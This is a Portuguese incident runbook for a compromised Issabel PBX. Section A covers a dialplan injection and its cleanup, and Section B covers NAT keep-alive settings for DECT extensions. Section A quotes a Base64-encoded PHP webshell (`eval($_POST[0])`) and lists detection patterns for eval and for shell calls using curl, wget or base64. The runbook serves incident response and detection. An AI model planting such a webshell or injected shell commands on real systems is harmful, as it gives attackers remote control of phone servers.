# Incidente tipo Couro Nobre (02/11/2026): injeção no dialplan e queda de NAT nos ramais

Dois problemas independentes que juntos faziam o ramal 200 (DECT Grandstream DP752/DP722, atrás de NAT) não receber chamadas.

## A. Injeção maliciosa no dialplan (invasão pelo painel web)
**Sintomas:** chamada para um ramal cai na hora com `SIP/2.0 603 Decline`/UNKNOWN antes de discar; o log mostra o contexto `injection-1` (arquivo `extensions_additional.conf`).
**Causa:** regra criada no módulo de injeções do PBX (ex.: `(200) s559368`) com payload Base64 `PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg==` = `<?php @eval($_POST[0]);?>` (tentativa de criar webshell PHP). Entrou por falha de RCE do `issabel-framework` antigo.
**Detecção automática:** o Sentinel (`ipbx-sentinel`, a cada minuto) alerta no Telegram quando o dialplan tem `[injection-N]`, `PD9waHA`, `eval(` ou `System()/Shell()` com curl/wget/base64 (`check_dialplan_injection`). Só alerta, não apaga. A auditoria (`ipbx-sentinel --audit`, seção 9) lista os mesmos achados. Teste: `ipbx-sentinel --selftest`.
**Correção (técnico):**
1. Remover a regra no módulo de injeções do painel clássico e recarregar a configuração do Asterisk.
2. Conferir: `grep -nE '^\[injection-|PD9waHA|eval *\(' /etc/asterisk/extensions*.conf` (sem resultado = limpo).
3. Procurar arquivos PHP novos/estranhos: `ipbx-sentinel --scan` (quarentena reversível, `--list`/`--restore`) e `find /var/www/html -name '*.php' -mtime -3`.
4. Atualizar o framework se pendente: `ipbx-sentinel --update-framework` (faz snapshot antes). `issabel-framework` 5.0.0-5 ou maior já está corrigido (aviso oficial de 02/08/2026: vulneráveis ≤ 4.0.0-12 / ≤ 5.0.0-3).
5. Trocar senhas de administração (painel e banco).
**Não fazemos:** restringir as portas 80/443 por IP (regra do projeto: o acesso ao PABX, por domínio ou por IP direto, nunca é restringido). A defesa é atualizar, fail2ban, alertas e quarentena.

## B. Queda de NAT (porta UDP fechada no roteador do cliente)
**Sintomas:** o ramal origina chamadas, mas as entrantes falham em período ocioso ("indisponível").
**Causa:** sem pacotes de manutenção, o roteador do cliente fecha o mapeamento UDP; o PABX não alcança o aparelho.
**Ajustes aplicados (manuais, por aparelho/ramal):**
| Onde | Parâmetro | Valor |
|---|---|---|
| Servidor SIP (GDMS/aparelho) | NAT Traversal | Keep-Alive |
| Base DP752 | Keep-Alive Interval | 20 s |
| Perfil SIP do aparelho | Register Expiration | 2 min |
| Issabel (extensões PJSIP) | `qualifyfreq` | 25 s |
Também: limpar contatos órfãos de um ramal com `asterisk -rx "database deltree registrar/contact/200"` (troque 200 pelo ramal) e confirmar um único registro estável (`pjsip show contacts`).
**Pendente de automatizar:** auditoria/ajuste de `qualifyfreq` e detecção de ramais que ficam "Indisponível" de forma intermitente (hoje o painel só mostra o estado).
